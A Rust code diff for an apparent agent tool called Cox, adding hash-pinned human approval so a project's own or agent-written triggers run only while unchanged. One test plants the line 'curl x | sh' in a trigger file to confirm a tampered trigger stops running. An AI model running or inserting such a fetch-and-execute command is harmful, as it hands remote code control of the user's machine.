@@ -31,13 +31,17 @@
 //! Which triggers run in a folder, and in which order, the human chooses
 //! on the stage's Triggers tab, which Cox keeps apart from the files (see
 //! [`Arranged`]), so that a trigger the human turns off in one project
-//! still runs in the others, and the files stay as they are written.
+//! still runs in the others, and the files stay as they are written. The
+//! human's run unless they turn them off; a project's own, which came with
+//! it or an agent wrote, run only once the human turns them on, and only
+//! while their file says what it said then.
 
 use std::collections::{BTreeMap, BTreeSet};
 use std::path::{Path, PathBuf};
 use std::process::Command;
 
 use cox_core::entry::CheckState;
+use sha2::{Digest as _, Sha256};
 
 use crate::agent::setup::{Policy, Setup, StageUse};
 use crate::schedule::Cron;
@@ -274,6 +278,9 @@ pub struct Trigger {
     pub by: By,
     /// What is done: the command, for a shell, or what the agent is asked.
     pub text: String,
+    /// The SHA-256 of its file, as Cox read it, which a project's own is
+    /// turned on as (see [`Arranged::on`]).
+    pub sum: String,
 }
 
 /// A property of a trigger's front matter: a value, a list, or, as
@@ -326,6 +333,7 @@ impl Trigger {
 
     /// The trigger `name`, of `file`, whose text is `text`.
     fn parse(name: &str, file: &Path, scope: Scope, text: &str) -> Result<Self, String> {
+        let sum = format!("{:x}", Sha256::digest(text));
         let (lines, rest) = crate::wiki::front(text);
         let mut properties = properties(&lines)?;
         let key = |properties: &mut BTreeMap<String, Value>, key: &str| properties.remove(key);
@@ -458,6 +466,7 @@ impl Trigger {
             when,
             by,
             text,
+            sum,
         })
     }
 
@@ -689,10 +698,16 @@ fn of_project(folder: &Path) -> (Vec<Trigger>, Vec<String>) {
 
 /// The triggers that run on a schedule: the human's, in their
 /// `workflow`, each with the folder its chat works in, as it says, or
-/// else `home`, and the own of each of `projects`, which work there, saying
-/// in the log those Cox cannot read.
+/// else `home`, and the own of each of `projects`, which work there, each
+/// turned on where it works, as `arranged` keeps it (see [`Arranged`]),
+/// saying in the log those Cox cannot read.
 #[must_use]
-pub fn scheduled(workflow: &Path, home: &Path, projects: &[PathBuf]) -> Vec<(Trigger, PathBuf)> {
+pub fn scheduled(
+    workflow: &Path,
+    home: &Path,
+    projects: &[PathBuf],
+    arranged: Option<&Path>,
+) -> Vec<(Trigger, PathBuf)> {
     let (global, mut unread) = read_all(&workflow.join(TRIGGERS), Scope::Global);
     let mut found: Vec<(Trigger, PathBuf)> = global
         .into_iter()
@@ -714,6 +729,9 @@ pub fn scheduled(workflow: &Path, home: &Path, projects: &[PathBuf]) -> Vec<(Tri
     for why in unread {
         tracing::warn!("a trigger does not run: {why}");
     }
+    let arranged = read_arranged(arranged);
+    let none = Arranged::default();
+    found.retain(|(trigger, works)| arranged.get(works).unwrap_or(&none).runs(trigger));
     found
 }
 
@@ -818,15 +836,20 @@ pub fn asked_to_gather(about: &str) -> String {
     format!("{}\n\nGather what you were asked.", about.trim())
 }
 
-/// Which triggers the human turned off in a folder, and the order they
-/// run in there, by their files, as the stage's Triggers tab sets them:
-/// kept in Cox's state (see [`crate::storage::Kept::Triggers`]), a folder
-/// each.
+/// Which triggers the human turned on or off in a folder, and the order
+/// they run in there, by their files, as the stage's Triggers tab sets
+/// them: kept in Cox's state (see [`crate::storage::Kept::Triggers`]), a
+/// folder each.
 #[derive(Clone, Debug, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
 pub struct Arranged {
-    /// The files of the triggers that do not run in the folder.
+    /// The files of the triggers the human turned off in the folder.
     #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
     pub off: BTreeSet<PathBuf>,
+    /// The files of the project's own triggers the human turned on in the
+    /// folder, each with the [`Trigger::sum`] of its file as they were
+    /// shown it.
+    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
+    pub on: BTreeMap<PathBuf, String>,
     /// The files of the triggers in the order they run in, those it does
     /// not name after them, as [`of`] orders them.
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
@@ -871,10 +894,21 @@ impl Arranged {
         triggers
             .into_iter()
             .map(|trigger| {
-                let on = !self.off.contains(&trigger.file);
+                let on = self.runs(&trigger);
                 (trigger, on)
             })
             .collect()
+    }
+
+    /// Whether `trigger` runs in the folder: one of the human's unless
+    /// they turned it off there, and a project's own only once they turned
+    /// it on there, while its file is as they were shown it.
+    #[must_use]
+    pub fn runs(&self, trigger: &Trigger) -> bool {
+        match trigger.scope {
+            Scope::Global => !self.off.contains(&trigger.file),
+            Scope::Project => self.on.get(&trigger.file) == Some(&trigger.sum),
+        }
     }
 }
 
@@ -932,10 +966,11 @@ pub struct Kept<'a> {
 /// What the stage's Triggers tab is told, as `cox://api/triggers`: the
 /// triggers of each folder it shows, `folders`, by its path and name, in
 /// the order they run in there, each with what its file says, whether it
-/// runs there, and how it last ran there; and why each Cox cannot read
-/// does not run. A schedule of the human's shows where its chat works,
-/// and in the home, if that is no folder shown, there; it runs there, or
-/// not, and when, as of `now`.
+/// runs there, and how it last ran there, and a project's own with the
+/// sum it is turned on as, and whether its file changed since it was;
+/// and why each Cox cannot read does not run. A schedule of the human's
+/// shows where its chat works, and in the home, if that is no folder
+/// shown, there; it runs there, or not, and when, as of `now`.
 #[must_use]
 pub fn told(
     folders: &[(PathBuf, Option<String>)],
@@ -979,6 +1014,11 @@ pub fn told(
                         "reject": reject,
                         "text": trigger.text.trim(),
                         "enabled": on,
+                        "sum": (trigger.scope == Scope::Project).then_some(&trigger.sum),
+                        "edited": arranged
+                            .on
+                            .get(&trigger.file)
+                            .is_some_and(|sum| *sum != trigger.sum),
                         "at": folder,
                         "ran": ran.get(&trigger.file),
                         "draft": card::Draft::of(&trigger),
@@ -991,10 +1031,8 @@ pub fn told(
                         let last = kept.schedules.last(&trigger.file.display().to_string());
                         if works != *folder {
                             told["at"] = serde_json::json!(works);
-                            told["enabled"] = (!Arranged::read(kept.arranged, &works)
-                                .off
-                                .contains(&trigger.file))
-                            .into();
+                            told["enabled"] =
+                                Arranged::read(kept.arranged, &works).runs(&trigger).into();
                         }
                         if let Some(last) = last {
                             told["ran"] = serde_json::json!({
@@ -1037,11 +1075,15 @@ pub fn told(
 #[derive(Debug, serde::Deserialize)]
 #[serde(untagged)]
 pub enum Change {
-    /// The trigger of `file` turned on, or off, in `folder`.
+    /// The trigger of `file` turned on, or off, in `folder`: a project's
+    /// own turned on as its file sums to `sum`, as the human was shown it,
+    /// and without it not at all.
     Switch {
         folder: PathBuf,
         file: PathBuf,
         on: bool,
+        #[serde(default)]
+        sum: Option<String>,
     },
     /// The triggers of `folder` ordered so, by their files.
     Order {
@@ -1068,10 +1110,14 @@ impl Change {
         let folder = self.folder().to_owned();
         let mut arranged = Arranged::read(kept, &folder);
         match self {
-            Self::Switch { file, on, .. } => {
+            Self::Switch { file, on, sum, .. } => {
                 if on {
                     arranged.off.remove(&file);
+                    if let Some(sum) = sum {
+                        arranged.on.insert(file, sum);
+                    }
                 } else {
+                    arranged.on.remove(&file);
                     arranged.off.insert(file);
                 }
             }
@@ -1086,12 +1132,12 @@ fn read_arranged(kept: Option<&Path>) -> BTreeMap<PathBuf, Arranged> {
     read_kept(kept)
 }
 
-/// Writes `all` to `path`, as JSON, a folder's each.
+/// Writes `all` to `path` whole, as JSON, a folder's each.
 fn write_kept<T: serde::Serialize>(path: &Path, all: &BTreeMap<PathBuf, T>) -> Result<(), String> {
     let text = serde_json::to_string_pretty(all).map_err(|error| error.to_string())?;
     path.parent()
         .map_or(Ok(()), std::fs::create_dir_all)
-        .and_then(|()| std::fs::write(path, text + "\n"))
+        .and_then(|()| crate::storage::write_whole(path, &(text + "\n")))
         .map_err(|error| format!("cannot write {}: {error}", path.display()))
 }
 
@@ -1270,6 +1316,7 @@ mod tests {
             folder: project.clone(),
             file: ci.clone(),
             on: false,
+            sum: None,
         }
         .make(Some(&arranged))
         .unwrap();
@@ -1291,12 +1338,32 @@ mod tests {
         assert_eq!(triggers[0]["enabled"], true);
         assert_eq!(triggers[0]["ran"]["state"], "failed");
         assert_eq!(triggers[0]["ran"]["said"], "FAIL: x");
+        assert_eq!(triggers[0]["sum"], serde_json::Value::Null);
         assert_eq!(triggers[1]["name"], "ci");
         assert_eq!(triggers[1]["by"], "shell");
         assert_eq!(triggers[1]["text"], "cargo test");
         assert_eq!(triggers[1]["enabled"], false);
         assert_eq!(triggers[1]["ran"], serde_json::Value::Null);
         assert_eq!(told["unread"].as_array().unwrap().len(), 1);
+
+        let ci_told = || {
+            super::told(&[(project.clone(), None)], &kept, &jiff::Zoned::now())["folders"][0]
+                ["triggers"][1]
+                .clone()
+        };
+        Change::Switch {
+            folder: project.clone(),
+            file: ci.clone(),
+            on: true,
+            sum: serde_json::from_value(ci_told()["sum"].clone()).unwrap(),
+        }
+        .make(Some(&arranged))
+        .unwrap();
+        assert_eq!(ci_told()["enabled"], true);
+        assert_eq!(ci_told()["edited"], false);
+        std::fs::write(&ci, "---\non: turn.end\nby: shell\n---\ncargo test --all\n").unwrap();
+        assert_eq!(ci_told()["enabled"], false);
+        assert_eq!(ci_told()["edited"], true);
         let _ = std::fs::remove_dir_all(&root);
     }
 
@@ -1374,6 +1441,7 @@ mod tests {
         let told = told(&[(project.clone(), None)], &kept, &now);
         assert_eq!(names(&told, 0), ["triage", "news"]);
         let triage = &told["folders"][0]["triggers"][0];
+        assert_eq!(triage["enabled"], false);
         assert_eq!(triage["schedule"]["cron"], "0 9 * * *");
         assert_eq!(triage["schedule"]["every"], "Daily 09:00");
         assert_eq!(triage["schedule"]["due"], true);
@@ -1385,6 +1453,7 @@ mod tests {
             folder: elsewhere.clone(),
             file: workflow.join(TRIGGERS).join("away.md"),
             on: false,
+            sum: None,
         }
         .make(Some(&arranged))
         .unwrap();
@@ -1411,17 +1480,52 @@ mod tests {
             tidy["schedule"]["next"],
             now.timestamp().as_second() + 2 * 3600
         );
+        let _ = std::fs::remove_dir_all(&root);
+    }
 
-        // coxd runs each where it works.
-        let found: Vec<(String, PathBuf)> =
-            scheduled(&workflow, &home, std::slice::from_ref(&project))
-                .into_iter()
-                .map(|(trigger, works)| (trigger.name, works))
-                .collect();
+    #[test]
+    fn coxd_runs_each_schedule_where_it_works_once_turned_on_there() {
+        let root = std::env::temp_dir().join(format!("cox-run-schedules-{}", std::process::id()));
+        let (home, project, elsewhere, workflow) = schedules_in(&root);
+        let arranged = root.join("triggers.json");
+        Change::Switch {
+            folder: elsewhere,
+            file: workflow.join(TRIGGERS).join("away.md"),
+            on: false,
+            sum: None,
+        }
+        .make(Some(&arranged))
+        .unwrap();
+        let found = || -> Vec<(String, PathBuf)> {
+            scheduled(
+                &workflow,
+                &home,
+                std::slice::from_ref(&project),
+                Some(&arranged),
+            )
+            .into_iter()
+            .map(|(trigger, works)| (trigger.name, works))
+            .collect()
+        };
         assert_eq!(
-            found,
+            found(),
             [
-                ("away".to_owned(), elsewhere.clone()),
+                ("news".to_owned(), project.clone()),
+                ("tidy".to_owned(), home.clone()),
+            ]
+        );
+        let triage = project.join(PROJECT_TRIGGERS).join("triage.md");
+        Change::Switch {
+            folder: project.clone(),
+            file: triage.clone(),
+            on: true,
+            sum: Some(Trigger::read(&triage, Scope::Project).unwrap().unwrap().sum),
+        }
+        .make(Some(&arranged))
+        .unwrap();
+        assert_eq!(
+            found(),
+            [
                 ("news".to_owned(), project.clone()),
                 ("tidy".to_owned(), home.clone()),
                 ("triage".to_owned(), project.clone()),
@@ -1439,8 +1543,9 @@ mod tests {
         assert_eq!(Arranged::read(Some(&kept), work), Arranged::default());
 
         let arranged = Arranged {
-            off: BTreeSet::from([PathBuf::from("/t/b.md")]),
-            order: vec![PathBuf::from("/t/c.md")],
+            off: BTreeSet::from([PathBuf::from("/w/b.md")]),
+            order: vec![PathBuf::from("/w/c.md")],
+            ..Arranged::default()
         };
         arranged.clone().keep(Some(&kept), work).unwrap();
         assert_eq!(Arranged::read(Some(&kept), work), arranged);
@@ -1449,7 +1554,7 @@ mod tests {
             Arranged::default()
         );
         let applied: Vec<(String, bool)> = arranged
-            .apply(vec![named("a"), named("b"), named("c")])
+            .apply(vec![human_s("a"), human_s("b"), human_s("c")])
             .into_iter()
             .map(|(trigger, on)| (trigger.name, on))
             .collect();
@@ -1465,6 +1570,127 @@ mod tests {
         // Arranged as at first, the folder is forgotten.
         Arranged::default().keep(Some(&kept), work).unwrap();
         assert_eq!(std::fs::read_to_string(&kept).unwrap(), "{}\n");
+        let _ = std::fs::remove_dir_all(kept.parent().unwrap());
+    }
+
+    fn human_s(name: &str) -> Trigger {
+        let file = PathBuf::from(format!("/w/{name}.md"));
+        Trigger::parse(
+            name,
+            &file,
+            Scope::Global,
+            "---\non: turn.end\nby: shell\n---\ntrue",
+        )
+        .unwrap()
+    }
+
+    fn running(arranged: &Arranged, triggers: Vec<Trigger>) -> Vec<(String, bool)> {
+        arranged
+            .apply(triggers)
+            .into_iter()
+            .map(|(trigger, on)| (trigger.name, on))
+            .collect()
+    }
+
+    #[test]
+    fn a_project_s_own_trigger_does_not_run_until_the_human_turns_it_on() {
+        assert_eq!(
+            running(&Arranged::default(), vec![named("ci"), human_s("simplify")]),
+            [("ci".to_owned(), false), ("simplify".to_owned(), true)]
+        );
+
+        let root = std::env::temp_dir().join(format!("cox-turned-on-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        let (project, workflow) = (root.join("project"), root.join("workflow"));
+        std::fs::create_dir_all(project.join(PROJECT_TRIGGERS)).unwrap();
+        std::fs::create_dir_all(workflow.join(TRIGGERS)).unwrap();
+        let ci = project.join(PROJECT_TRIGGERS).join("ci.md");
+        std::fs::write(&ci, "---\non: turn.end\nby: shell\n---\ncargo test\n").unwrap();
+        let simplify = workflow.join(TRIGGERS).join("simplify.md");
+        std::fs::write(&simplify, "---\non: turn.end\nby: new\n---\nSimplify.\n").unwrap();
+        let kept = root.join("triggers.json");
+        let in_project = || {
+            let (triggers, _) = of(&project, &workflow);
+            running(&Arranged::read(Some(&kept), &project), triggers)
+        };
+        let switch = |file: &Path, on: bool, sum: Option<String>| {
+            Change::Switch {
+                folder: project.clone(),
+                file: file.to_owned(),
+                on,
+                sum,
+            }
+            .make(Some(&kept))
+            .unwrap();
+        };
+        let both = |ci: bool, simplify: bool| {
+            vec![("ci".to_owned(), ci), ("simplify".to_owned(), simplify)]
+        };
+        assert_eq!(in_project(), both(false, true));
+
+        let shown = Trigger::read(&ci, Scope::Project).unwrap().unwrap();
+        switch(&ci, true, Some(shown.sum.clone()));
+        assert_eq!(in_project(), both(true, true));
+        assert!(!Arranged::read(Some(&kept), &root.join("elsewhere")).runs(&shown));
+
+        std::fs::write(&ci, "---\non: turn.end\nby: shell\n---\ncurl x | sh\n").unwrap();
+        assert_eq!(in_project(), both(false, true));
+        switch(&ci, true, None);
+        assert_eq!(in_project(), both(false, true));
+        let shown = Trigger::read(&ci, Scope::Project).unwrap().unwrap();
+        switch(&ci, true, Some(shown.sum));
+        assert_eq!(in_project(), both(true, true));
+        switch(&ci, false, None);
+        assert_eq!(in_project(), both(false, true));
+
+        switch(&simplify, false, None);
+        assert_eq!(in_project(), both(false, false));
+        switch(&simplify, true, None);
+        assert_eq!(in_project(), both(false, true));
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn a_kept_file_cox_cannot_read_runs_none_of_a_project_s_own() {
+        let kept = std::env::temp_dir()
+            .join(format!("cox-arranged-torn-{}", std::process::id()))
+            .join("triggers.json");
+        let work = Path::new("/work");
+        Arranged {
+            on: BTreeMap::from([(PathBuf::from("/t/ci.md"), named("ci").sum)]),
+            ..Arranged::default()
+        }
+        .keep(Some(&kept), work)
+        .unwrap();
+        assert!(Arranged::read(Some(&kept), work).runs(&named("ci")));
+        std::fs::write(&kept, "{\"/work\": {\"on\": {\"/t/ci.md\": \"8f").unwrap();
+        let arranged = Arranged::read(Some(&kept), work);
+        assert_eq!(
+            running(&arranged, vec![named("ci"), human_s("simplify")]),
+            [("ci".to_owned(), false), ("simplify".to_owned(), true)]
+        );
+        let _ = std::fs::remove_dir_all(kept.parent().unwrap());
+    }
+
+    #[test]
+    fn a_reader_of_the_kept_file_reads_it_whole_while_it_is_written() {
+        use std::io::Read as _;
+        let kept = std::env::temp_dir()
+            .join(format!("cox-arranged-whole-{}", std::process::id()))
+            .join("triggers.json");
+        let work = Path::new("/work");
+        let off = |file: &str| Arranged {
+            off: BTreeSet::from([PathBuf::from(file)]),
+            ..Arranged::default()
+        };
+        off("/w/a.md").keep(Some(&kept), work).unwrap();
+        let mut reading = std::fs::File::open(&kept).unwrap();
+        off("/w/b.md").keep(Some(&kept), work).unwrap();
+        let mut text = String::new();
+        reading.read_to_string(&mut text).unwrap();
+        let read: BTreeMap<PathBuf, Arranged> = serde_json::from_str(&text).unwrap();
+        assert_eq!(read[work], off("/w/a.md"));
+        assert_eq!(Arranged::read(Some(&kept), work), off("/w/b.md"));
         let _ = std::fs::remove_dir_all(kept.parent().unwrap());
     }
 
